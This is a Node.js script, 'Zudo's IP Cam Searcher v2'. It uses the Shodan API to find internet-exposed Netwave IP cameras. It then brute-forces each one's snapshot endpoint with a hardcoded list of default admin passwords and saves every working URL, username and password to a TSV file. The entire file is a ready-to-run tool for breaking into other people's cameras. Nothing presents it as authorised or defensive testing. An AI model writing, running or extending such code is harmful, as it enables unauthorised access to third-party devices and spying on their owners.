const shodan = require("shodan-client");
const request = require("request");
const colours = require("colors");
const lock = require("lockfile");
const config = require("./config");
const fs = require("fs");

const API_KEY = config.apiKey;
const DEFAULT_PASSWORDS = ["","123456","12345","admin","admin123","admin123456", "admin12345678910", "admin1", "admin321", "admin1", "admin2", "admin3", "admin4", "admin5", "admin6", "admin7", "admin8", "admin9", "foscam", "qwertyuiop", "qwerty", "Admin", "one23456"];

let cameras = [];

function updateOutput() {
  lock.check("output.lock", (locked) => {
    if (!locked) {
      lock.lock("output.lock", (error) => {
        if (error) {
          console.log("[Error]".red,"Couldn't obtain lock");
        } else {
          stream = fs.createWriteStream("output.tsv");
          stream.once("open", () => {
            stream.write("URL\tUsername\tPassword\n")
            for (c in cameras) {
              stream.write(cameras[c].url + "\t" + cameras[c].username + "\t" + cameras[c].password + "\n");
            }
            stream.end();
            lock.unlockSync("output.lock");
          });
        }
      });
    }
  });
}

function testAllCameras(matches) {
  console.log("[Shodan]".blue,"Found " + matches.length + " total cameras - beginning test.");
  for (m in matches) {
    camera = matches[m];
    test_url = "http://"+camera.ip_str+":"+camera.port+"/snapshot.cgi?user=admin&pwd=";
    for (p in DEFAULT_PASSWORDS) {
      request(test_url+DEFAULT_PASSWORDS[p], (e,r,b) => {
        if (e) {
          return;
        }
        if (r.statusCode == 200) {
          console.log("[Scan]".magenta,"The password for " + "http://"+r.request.host+":"+r.request.port+"/" + " is '" + r.request.req.path.split("&pwd=")[1] + "'");
          cameras.push({"url":"http://"+r.request.host+":"+r.request.port+"/","username":"admin","password":r.request.req.path.split("&pwd=")[1]});
          updateOutput();
        }
      });
    }
  }
}

console.log("Zudo's IP Cam Searcher v2".bold.yellow);

shodan.apiInfo(API_KEY).then(d => {
  console.log("[Shodan]".blue,"You have",d.query_credits,"query credits left.");
}).catch(error => {
  console.log("[Error]".red,error);
});

console.log("[Info]".green,"Searching live Shodan data.");
shodan.search("'netwave ip camera'", API_KEY)
.then(result => {
  matches = result.matches;
  testAllCameras(matches);
})
.catch(error => {
  console.log("[Error]".red,error);
})
